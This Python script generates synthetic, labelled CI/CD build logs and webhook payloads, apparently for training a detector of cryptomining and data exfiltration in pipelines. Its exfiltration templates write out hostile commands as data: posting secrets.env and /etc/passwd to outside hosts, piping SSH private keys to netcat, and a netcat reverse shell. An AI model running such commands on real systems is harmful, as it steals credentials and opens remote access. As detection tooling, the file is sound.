"""
SafeOps Synthetic Data Generator (Optimized)

Fast synthetic CI/CD build log generator using pre-computed values.
Designed for quick dataset generation while maintaining realistic data patterns.

Usage:
    python synthetic_generator.py --builds 1000 --output output/
"""

import os
import json
import random
import hashlib
import argparse
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from typing import List, Dict, Tuple
from pathlib import Path

import numpy as np
import pandas as pd

# Set seeds for reproducibility
np.random.seed(42)
random.seed(42)

# Pre-computed realistic values (faster than faker)
USERNAMES = ["alice", "bob", "charlie", "diana", "eve", "frank", "grace", "henry"]
PACKAGES = ["lodash", "express", "react", "axios", "webpack", "jest", "eslint", "prettier"]
DOMAINS = ["example.com", "test.io", "acme.corp", "startup.dev", "cloud.services"]
FILE_NAMES = ["app.ts", "index.js", "main.py", "utils.go", "service.java", "handler.rs"]
TEST_NAMES = ["auth_login", "user_create", "api_health", "db_connect", "cache_hit"]
EXCEPTIONS = ["NullPointerException", "TypeError", "RuntimeError", "ValueError"]


@dataclass
class BuildStep:
    """Represents a single step in a CI/CD pipeline."""
    name: str
    status: str
    started_at: datetime
    finished_at: datetime
    log_lines: List[str] = field(default_factory=list)
    
    @property
    def duration_seconds(self) -> float:
        return (self.finished_at - self.started_at).total_seconds()


@dataclass
class BuildLog:
    """Represents a complete CI/CD build execution."""
    build_id: str
    repo_name: str
    branch: str
    commit_sha: str
    trigger: str
    status: str
    started_at: datetime
    finished_at: datetime
    steps: List[BuildStep] = field(default_factory=list)
    label: str = "normal"
    raw_logs: str = ""
    
    @property
    def duration_seconds(self) -> float:
        return (self.finished_at - self.started_at).total_seconds()
    
    @property
    def total_log_lines(self) -> int:
        return sum(len(step.log_lines) for step in self.steps)
    
    def to_feature_vector(self) -> Dict:
        """Extract features for ML model."""
        all_logs = "\n".join(
            line for step in self.steps for line in step.log_lines
        )
        
        error_count = sum(
            1 for step in self.steps 
            for line in step.log_lines 
            if any(kw in line.lower() for kw in ['error', 'failed', 'exception'])
        )
        
        warning_count = sum(
            1 for step in self.steps 
            for line in step.log_lines 
            if any(kw in line.lower() for kw in ['warning', 'warn', 'deprecated'])
        )
        
        char_density = len(all_logs) / max(self.total_log_lines, 1)
        event_dist = {step.name: len(step.log_lines) for step in self.steps}
        
        return {
            "build_id": self.build_id,
            "repo_name": self.repo_name,
            "branch": self.branch,
            "commit_sha": self.commit_sha,
            "duration_seconds": self.duration_seconds,
            "log_line_count": self.total_log_lines,
            "char_density": round(char_density, 2),
            "error_count": error_count,
            "warning_count": warning_count,
            "step_count": len(self.steps),
            "event_distribution": json.dumps(event_dist),
            "build_started_at": self.started_at.isoformat(),
            "build_finished_at": self.finished_at.isoformat(),
            "label": self.label
        }
    
    def to_webhook_payload(self, provider: str = "github") -> Dict:
        """Convert to webhook payload format."""
        return {
            "action": "completed",
            "workflow_run": {
                "id": int(self.build_id.replace("build-", "")),
                "name": "CI Pipeline",
                "head_branch": self.branch,
                "head_sha": self.commit_sha,
                "status": "completed",
                "conclusion": self.status,
                "run_started_at": self.started_at.isoformat() + "Z",
                "updated_at": self.finished_at.isoformat() + "Z",
            },
            "repository": {
                "full_name": self.repo_name,
                "name": self.repo_name.split("/")[-1]
            },
            "sender": {"login": random.choice(USERNAMES)},
            "_safeops_extended": {
                "raw_logs": self.raw_logs,
                "steps": [
                    {
                        "name": step.name,
                        "status": step.status,
                        "started_at": step.started_at.isoformat(),
                        "finished_at": step.finished_at.isoformat(),
                        "log_lines": step.log_lines
                    }
                    for step in self.steps
                ],
                "label": self.label
            }
        }


class LogLineGenerator:
    """Fast log line generator using templates."""
    
    @staticmethod
    def normal_line() -> str:
        templates = [
            f"[{datetime.now().strftime('%H:%M:%S')}] INFO: Processing request",
            f"Step {random.randint(1,10)}/10: Building",
            f"✓ {random.choice(['build', 'test', 'lint'])} completed",
            f"Installing {random.choice(PACKAGES)}@{random.randint(1,5)}.{random.randint(0,20)}.0",
            f"Compiling src/{random.choice(FILE_NAMES)}...",
            f"  PASS: test_{random.choice(TEST_NAMES)} ({random.randint(1,500)}ms)",
            f"Cache hit for key-{random.randint(1000,9999)}",
            f"Artifact uploaded: build.tar.gz ({random.randint(1,50)}MB)",
        ]
        return random.choice(templates)
    
    @staticmethod
    def warning_line() -> str:
        templates = [
            f"[{datetime.now().strftime('%H:%M:%S')}] WARN: Deprecated API usage",
            f"WARNING: {random.choice(PACKAGES)} has known vulnerabilities",
            f"⚠ DEPRECATION: Feature will be removed in v{random.randint(2,5)}.0",
        ]
        return random.choice(templates)
    
    @staticmethod
    def error_line() -> str:
        templates = [
            f"[{datetime.now().strftime('%H:%M:%S')}] ERROR: Connection failed",
            f"✗ build failed with exit code {random.randint(1,127)}",
            f"FAILED: test_{random.choice(TEST_NAMES)}",
            f"Exception: {random.choice(EXCEPTIONS)}",
        ]
        return random.choice(templates)
    
    @staticmethod
    def cryptomining_line() -> str:
        templates = [
            f"xmrig: Starting mining on pool.{random.choice(DOMAINS)}:3333",
            f"Connecting to stratum+tcp://mine.{random.choice(DOMAINS)}:3333",
            f"cryptonight: Hashrate: {random.randint(100,10000)} H/s",
            f"Accepted share #{random.randint(1,1000)}",
            f"minerd: {random.randint(4,16)} threads active",
            f"GPU #{random.randint(0,3)}: {random.randint(60,85)}°C, mining",
        ]
        return random.choice(templates)
    
    @staticmethod
    def exfiltration_line() -> str:
        ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        templates = [
            f"curl -X POST https://{random.choice(DOMAINS)}/collect -d @secrets.env",
            f"wget --post-data=\"$(cat /etc/passwd)\" https://{random.choice(DOMAINS)}/",
            f"echo $(cat ~/.ssh/id_rsa) | base64 | nc {ip} {random.randint(1024,65535)}",
            f"tar czf - /home | curl -X POST -d @- https://{random.choice(DOMAINS)}/upload",
            f"Sending {random.randint(10,500)}MB of data to {random.choice(DOMAINS)}",
            f"nc -e /bin/sh {ip} {random.randint(1024,65535)}",
        ]
        return random.choice(templates)


class SyntheticDataGenerator:
    """Main generator class."""
    
    PIPELINE_STEPS = [
        {"name": "checkout", "duration_ratio": 0.05},
        {"name": "setup_environment", "duration_ratio": 0.10},
        {"name": "install_dependencies", "duration_ratio": 0.20},
        {"name": "run_tests", "duration_ratio": 0.35},
        {"name": "build_artifact", "duration_ratio": 0.20},
        {"name": "deploy", "duration_ratio": 0.10}
    ]
    
    REPOSITORIES = [
        "acme-corp/web-app",
        "acme-corp/api-service",
        "acme-corp/data-pipeline",
        "startup-io/mobile-backend",
        "startup-io/auth-service"
    ]
    
    PROFILES = {
        "normal": {"duration_mean": 120, "duration_std": 15, "lines_mean": 500, "lines_std": 100},
        "cryptomining": {"duration_mean": 600, "duration_std": 120, "lines_mean": 800, "lines_std": 150},
        "exfiltration": {"duration_mean": 180, "duration_std": 30, "lines_mean": 5000, "lines_std": 1000}
    }
    
    def __init__(self):
        self.build_counter = 0
        self.line_gen = LogLineGenerator()
    
    def generate_build(self, label: str = "normal") -> BuildLog:
        """Generate a single build."""
        self.build_counter += 1
        profile = self.PROFILES[label]
        
        repo = random.choice(self.REPOSITORIES)
        branch = random.choice(["main", "develop", f"feature/feat-{random.randint(100,999)}"])
        commit_sha = hashlib.sha1(str(random.random()).encode()).hexdigest()
        
        duration = max(10, np.random.normal(profile["duration_mean"], profile["duration_std"]))
        target_lines = max(50, int(np.random.normal(profile["lines_mean"], profile["lines_std"])))
        
        started_at = datetime.now() - timedelta(days=random.randint(1, 30))
        finished_at = started_at + timedelta(seconds=duration)
        
        steps = self._generate_steps(started_at, duration, target_lines, label)
        raw_logs = "\n".join(line for step in steps for line in step.log_lines)
        
        return BuildLog(
            build_id=f"build-{self.build_counter:06d}",
            repo_name=repo,
            branch=branch,
            commit_sha=commit_sha,
            trigger=random.choice(["push", "pull_request", "schedule"]),
            status=random.choice(["success", "success", "success", "failure"]),
            started_at=started_at,
            finished_at=finished_at,
            steps=steps,
            label=label,
            raw_logs=raw_logs
        )
    
    def _generate_steps(self, started_at, total_duration, target_lines, label) -> List[BuildStep]:
        """Generate pipeline steps."""
        steps = []
        current_time = started_at
        lines_per_step = target_lines // len(self.PIPELINE_STEPS)
        
        for i, step_cfg in enumerate(self.PIPELINE_STEPS):
            step_duration = total_duration * step_cfg["duration_ratio"]
            step_finished = current_time + timedelta(seconds=step_duration)
            
            log_lines = self._generate_step_logs(
                step_cfg["name"], lines_per_step, label,
                is_last=(i == len(self.PIPELINE_STEPS) - 1)
            )
            
            steps.append(BuildStep(
                name=step_cfg["name"],
                status="success",
                started_at=current_time,
                finished_at=step_finished,
                log_lines=log_lines
            ))
            current_time = step_finished
        
        return steps
    
    def _generate_step_logs(self, step_name, target_lines, label, is_last) -> List[str]:
        """Generate log lines for a step."""
        lines = [f"=== Step: {step_name} ==="]
        
        for _ in range(max(1, target_lines - 5)):
            rand = random.random()
            if rand < 0.90:
                lines.append(self.line_gen.normal_line())
            elif rand < 0.97:
                lines.append(self.line_gen.warning_line())
            else:
                lines.append(self.line_gen.error_line())
        
        # Inject attack patterns
        if label == "cryptomining" and step_name in ["run_tests", "build_artifact"]:
            for _ in range(random.randint(5, 15)):
                lines.insert(random.randint(0, len(lines)), self.line_gen.cryptomining_line())
        
        elif label == "exfiltration" and (step_name == "deploy" or is_last):
            for _ in range(random.randint(10, 30)):
                lines.insert(random.randint(0, len(lines)), self.line_gen.exfiltration_line())
        
        lines.append(f"=== Step {step_name} completed ===")
        return lines
    
    def generate_dataset(self, num_builds: int = 1000) -> Tuple[List[BuildLog], List[BuildLog]]:
        """Generate complete dataset with train/test split."""
        normal_count = int(num_builds * 0.90)
        crypto_count = int(num_builds * 0.05)
        exfil_count = num_builds - normal_count - crypto_count
        
        print(f"Generating {num_builds} builds:")
        print(f"  - Normal: {normal_count}")
        print(f"  - Cryptomining: {crypto_count}")
        print(f"  - Exfiltration: {exfil_count}")
        
        all_builds = []
        
        for i in range(normal_count):
            all_builds.append(self.generate_build("normal"))
            if (i + 1) % 100 == 0:
                print(f"  Generated {i + 1} normal builds...")
        
        for _ in range(crypto_count):
            all_builds.append(self.generate_build("cryptomining"))
        
        for _ in range(exfil_count):
            all_builds.append(self.generate_build("exfiltration"))
        
        random.shuffle(all_builds)
        
        split_idx = int(len(all_builds) * 0.8)
        return all_builds[:split_idx], all_builds[split_idx:]
    
    def save_to_csv(self, builds: List[BuildLog], output_path: str) -> pd.DataFrame:
        """Save builds to CSV."""
        features = [build.to_feature_vector() for build in builds]
        df = pd.DataFrame(features)
        
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        df.to_csv(output_path, index=False)
        print(f"Saved {len(df)} records to {output_path}")
        return df
    
    def save_webhooks(self, builds: List[BuildLog], output_dir: str) -> None:
        """Save webhook JSON files."""
        os.makedirs(output_dir, exist_ok=True)
        
        for build in builds:
            filepath = os.path.join(output_dir, f"{build.build_id}.json")
            with open(filepath, 'w') as f:
                json.dump(build.to_webhook_payload(), f, indent=2, default=str)
        
        print(f"Saved {len(builds)} webhook payloads to {output_dir}")


def main():
    parser = argparse.ArgumentParser(description="Generate synthetic CI/CD build logs")
    parser.add_argument("--output", type=str, default="output", help="Output directory")
    parser.add_argument("--builds", type=int, default=1000, help="Number of builds")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    args = parser.parse_args()
    
    np.random.seed(args.seed)
    random.seed(args.seed)
    
    generator = SyntheticDataGenerator()
    train_builds, test_builds = generator.generate_dataset(args.builds)
    
    # Save CSV files
    train_df = generator.save_to_csv(train_builds, os.path.join(args.output, "training_data.csv"))
    test_df = generator.save_to_csv(test_builds, os.path.join(args.output, "test_data.csv"))
    
    # Save sample webhooks
    generator.save_webhooks(train_builds[:50], os.path.join(args.output, "webhooks"))
    
    # Summary
    print("\n=== Dataset Summary ===")
    print(f"\nTraining Data ({len(train_df)} samples):")
    print(f"Label Distribution:\n{train_df['label'].value_counts()}")
    print(f"\nFeature Statistics:")
    print(train_df[['duration_seconds', 'log_line_count', 'error_count']].describe())


if __name__ == "__main__":
    main()
